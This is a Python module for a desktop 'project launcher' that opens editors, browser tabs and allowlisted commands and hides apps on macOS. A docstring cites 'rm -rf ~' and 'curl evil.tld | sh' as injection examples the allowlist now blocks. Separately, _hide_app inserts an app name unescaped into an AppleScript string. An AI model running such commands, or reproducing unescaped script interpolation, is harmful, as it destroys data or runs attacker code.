"""
Launcher — Project Launcher

Handles the actual launching of a project:
- Opens VS Code workspace
- Opens Chrome URLs
- Runs terminal commands
- Hides distraction apps via macOS osascript
- Sets the session focus goal
"""

from __future__ import annotations

import asyncio
import logging
import sys
from collections.abc import Sequence
from pathlib import Path

from cortex.libs.utils.shell_allowlist import validate_command
from cortex.services.launcher.project_config import ProjectConfig

logger = logging.getLogger(__name__)


def _terminate_process(
    proc: asyncio.subprocess.Process,
    label: str,
) -> None:
    """B14 (Phase 4.1): best-effort SIGTERM on a subprocess.

    Called from the cancellation arms of ``_open_vscode`` /
    ``_open_chrome_url`` / ``_hide_app`` to make sure an in-flight
    child is reaped instead of orphaned. We DO NOT await its exit here
    — the caller is in the middle of propagating a cancellation and
    must not block on another await. The kernel reaps the process when
    it eventually exits; if it ignores SIGTERM the parent's eventual
    exit will (on POSIX) send SIGKILL via the init-handover path.
    """
    try:
        proc.terminate()
        logger.debug("Terminated child %s (pid=%s) on cancellation", label, proc.pid)
    except ProcessLookupError:
        # Already exited between the cancellation and our terminate call.
        logger.debug("child %s (pid=%s) already exited", label, proc.pid)
    except Exception:
        logger.warning(
            "Failed to terminate child %s (pid=%s) on cancellation",
            label,
            getattr(proc, "pid", "?"),
            exc_info=True,
        )


class ProjectLauncher:
    """
    Launches a project environment with zero friction.

    Automates the tedious setup: opening the right workspace, tabs,
    running Docker, and hiding distractions — so the user can start
    working immediately.

    Usage:
        launcher = ProjectLauncher(storage_path="./storage")
        await launcher.launch("OS Project 3")
    """

    def __init__(
        self,
        storage_path: str = "./storage",
        *,
        user_command_allowlist: Sequence[str] | None = None,
    ) -> None:
        self._storage_path = Path(storage_path)
        self._is_macos = sys.platform == "darwin"
        # Audit F12: power users can extend the built-in shell allowlist
        # via ``LauncherConfig.user_command_allowlist``; the daemon
        # threads that list in here at construction time.
        self._user_command_allowlist: tuple[str, ...] = tuple(
            user_command_allowlist or ()
        )

    async def launch(self, project_name: str) -> dict:
        """
        Launch a project by name.

        Args:
            project_name: Name of the project to launch.

        Returns:
            Dict with launch results.
        """
        configs = ProjectConfig.list_projects(self._storage_path)
        config = None
        for c in configs:
            if c.name.lower() == project_name.lower():
                config = c
                break

        if config is None:
            return {"success": False, "error": f"Project '{project_name}' not found"}

        results: dict = {"success": True, "steps": []}

        # Step 1: Open VS Code workspace
        if config.vscode_workspace:
            ok = await self._open_vscode(config.vscode_workspace)
            results["steps"].append({"action": "open_vscode", "success": ok})

        # Step 2: Open Chrome URLs
        for url in config.chrome_urls:
            ok = await self._open_chrome_url(url)
            results["steps"].append({"action": "open_url", "url": url, "success": ok})

        # Step 3: Run terminal commands (audit F12: allowlist-gated)
        for cmd in config.terminal_commands:
            step = await self._run_terminal_command(cmd)
            results["steps"].append(step)

        # Step 4: Hide distraction apps
        for app in config.hide_apps:
            ok = await self._hide_app(app)
            results["steps"].append({"action": "hide_app", "app": app, "success": ok})

        logger.info("Project '%s' launched: %s", project_name, results)
        return results

    async def save_current_as_project(
        self,
        name: str,
        vscode_workspace: str = "",
        chrome_urls: list[str] | None = None,
        focus_goal: str = "",
    ) -> ProjectConfig:
        """
        Save the current workspace state as a project config.

        Args:
            name: Project name.
            vscode_workspace: VS Code workspace path.
            chrome_urls: URLs currently open.
            focus_goal: Session focus goal.

        Returns:
            The saved ProjectConfig.
        """
        config = ProjectConfig(
            name=name,
            vscode_workspace=vscode_workspace,
            chrome_urls=chrome_urls or [],
            focus_goal=focus_goal,
        )
        config.save(self._storage_path)
        logger.info("Saved project config: %s", name)
        return config

    def list_projects(self) -> list[dict]:
        """List all available project configs."""
        configs = ProjectConfig.list_projects(self._storage_path)
        return [c.model_dump() for c in configs]

    async def _open_vscode(self, workspace: str) -> bool:
        """Open VS Code workspace/directory.

        B14 (Phase 4.1): wrap ``proc.wait()`` in :func:`asyncio.shield`
        so an outer cancellation doesn't orphan the subprocess. On
        cancellation we explicitly ``terminate`` the process and wait
        a moment for it to exit before letting the cancel propagate.
        """
        proc: asyncio.subprocess.Process | None = None
        try:
            proc = await asyncio.create_subprocess_exec(
                "code", workspace,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(asyncio.shield(proc.wait()), timeout=10)
            return proc.returncode == 0
        except asyncio.CancelledError:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "code")
            raise
        except Exception:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "code")
            logger.debug("Failed to open VS Code: %s", workspace)
            return False

    async def _open_chrome_url(self, url: str) -> bool:
        """Open a URL in Chrome.

        B14 (Phase 4.1): same shield + terminate-on-cancel contract as
        ``_open_vscode``.
        """
        if not self._is_macos:
            return False
        proc: asyncio.subprocess.Process | None = None
        try:
            proc = await asyncio.create_subprocess_exec(
                "open", "-a", "Google Chrome", url,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(asyncio.shield(proc.wait()), timeout=10)
            return proc.returncode == 0
        except asyncio.CancelledError:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "open Google Chrome")
            raise
        except Exception:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "open Google Chrome")
            logger.debug("Failed to open URL: %s", url)
            return False

    async def _run_terminal_command(self, command: str) -> dict:
        """Run a terminal command in the background.

        Audit F12: the legacy implementation passed ``command`` straight
        to :func:`asyncio.create_subprocess_shell`. A hostile project
        YAML could therefore inject arbitrary shell (``rm -rf ~``,
        ``curl evil.tld | sh``). We now tokenise via
        :func:`cortex.libs.utils.shell_allowlist.validate_command`,
        reject anything whose binary is not on the editor/terminal
        allowlist (extensible via ``LauncherConfig.user_command_allowlist``),
        and dispatch with :func:`asyncio.create_subprocess_exec` so no
        shell ever sees the user-supplied string.

        Returns a step record:

        * ``{"action": "run_command", "command": <cmd>, "success": True}``
          on a successful spawn.
        * ``{"action": "run_command", "command": <cmd>, "success": False,
          "error": "unsupported_command"}`` when the command is rejected.
          The ``command`` field is the original quoted string so the UI
          can surface it back to the user verbatim.
        """
        argv, error = validate_command(
            command,
            allowlist=self._user_command_allowlist or None,
        )
        if error is not None:
            logger.warning(
                "Rejected unsupported terminal command: %r (%s)",
                command,
                error,
            )
            return {
                "action": "run_command",
                "command": command,
                "success": False,
                "error": "unsupported_command",
                "reason": error,
            }

        try:
            await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            # Don't wait for completion — some commands are long-running (docker)
            await asyncio.sleep(1.0)
            return {
                "action": "run_command",
                "command": command,
                "success": True,
            }
        except Exception as exc:
            logger.debug("Failed to run command: %s (%s)", command, exc)
            return {
                "action": "run_command",
                "command": command,
                "success": False,
                "error": "spawn_failed",
            }

    async def _hide_app(self, app_name: str) -> bool:
        """Hide an application using macOS osascript.

        B14 (Phase 4.1): shield + terminate-on-cancel.
        """
        if not self._is_macos:
            return False
        script = f'tell application "System Events" to set visible of process "{app_name}" to false'
        proc: asyncio.subprocess.Process | None = None
        try:
            proc = await asyncio.create_subprocess_exec(
                "osascript", "-e", script,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(asyncio.shield(proc.wait()), timeout=5)
            return proc.returncode == 0
        except asyncio.CancelledError:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "osascript")
            raise
        except Exception:
            if proc is not None and proc.returncode is None:
                _terminate_process(proc, "osascript")
            logger.debug("Failed to hide app: %s", app_name)
            return False
